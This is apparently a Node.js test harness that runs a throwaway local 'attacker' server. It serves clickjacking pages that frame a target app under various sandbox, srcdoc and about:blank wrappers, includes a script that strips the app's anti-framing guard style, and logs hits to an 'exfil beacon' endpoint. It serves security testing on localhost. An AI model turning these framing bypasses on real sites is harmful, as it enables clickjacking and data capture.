// vp3-evil-server.mjs — throwaway "attacker" origin on 127.0.0.1:<port>.
// Serves attacker pages (frame.html variants) and LOGS every hit (beacon proof).
import { createServer } from 'node:http';
import { appendFileSync } from 'node:fs';

const PORT = Number(process.argv[2] || 9777);
const LOG = '/tmp/vp3/evil-hits.log';

const PAGES = {
  '/frame.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL ATTACKER PAGE</h1>
    <iframe id="f" src="http://127.0.0.1:8090/index.html" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sandbox-noscripts-nav.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL sandbox no-allow-top-navigation</h1>
    <iframe id="f" src="http://127.0.0.1:8090/index.html" sandbox="allow-scripts" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sandbox-sameorigin.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL sandbox allow-scripts allow-same-origin (NO top-nav)</h1>
    <iframe id="f" src="http://127.0.0.1:8090/index.html" sandbox="allow-scripts allow-same-origin" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sandbox-topnav.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL sandbox allow-scripts allow-top-navigation</h1>
    <iframe id="f" src="http://127.0.0.1:8090/index.html" sandbox="allow-scripts allow-top-navigation" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sandbox-all.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL sandbox allow-scripts allow-same-origin allow-top-navigation</h1>
    <iframe id="f" src="http://127.0.0.1:8090/index.html" sandbox="allow-scripts allow-same-origin allow-top-navigation" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-srcdoc.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL srcdoc wrapper</h1>
    <iframe id="f" sandbox="allow-scripts allow-same-origin allow-top-navigation allow-popups" style="width:900px;height:600px"></iframe>
    <script>document.getElementById('f').srcdoc='<!doctype html><iframe src="http://127.0.0.1:8090/index.html" style="width:95%;height:95%"></iframe>';</script>
  </body></html>`,
  '/frame-aboutblank.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL about:blank wrapper</h1>
    <iframe id="f" style="width:900px;height:600px"></iframe>
    <script>
      const f = document.getElementById('f');
      f.src = 'about:blank';
      f.onload = () => {
        const d = f.contentDocument;
        d.open(); d.write('<iframe src="http://127.0.0.1:8090/index.html" style="width:95%;height:95%"></iframe>'); d.close();
      };
    </script>
  </body></html>`,
  '/frame-sameorigin.html': `<!doctype html><html><body style="margin:0">
    <h1>EVIL-ISH page hosted on the APP origin (8090) — plain iframe</h1>
    <iframe id="f" src="/index.html" style="width:900px;height:600px"></iframe>
  </body></html>`,
  '/frame-sameorigin-sandbox.html': `<!doctype html><html><body style="margin:0">
    <h1>SAME-ORIGIN parent + sandbox allow-scripts allow-same-origin (no top-nav)</h1>
    <iframe id="f" src="/index.html" sandbox="allow-scripts allow-same-origin" style="width:900px;height:600px"></iframe>
    <button onclick="strip()">strip guard style</button>
    <script>
      function strip() {
        const d = document.getElementById('f').contentDocument;
        for (const s of [...d.querySelectorAll('style')]) if (s.textContent.includes('visibility:hidden')) s.remove();
      }
    </script>
  </body></html>`,
};

createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  appendFileSync(LOG, new Date().toISOString() + ' ' + req.method + ' ' + req.url + ' referer=' + (req.headers.referer || '-') + '\n');
  if (PAGES[u.pathname]) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    res.end(PAGES[u.pathname]);
    return;
  }
  // any other path = "attacker endpoint reached" (exfil beacon)
  res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
  res.end('evil-reached:' + u.pathname);
}).listen(PORT, '127.0.0.1', () => console.log('evil on ' + PORT));
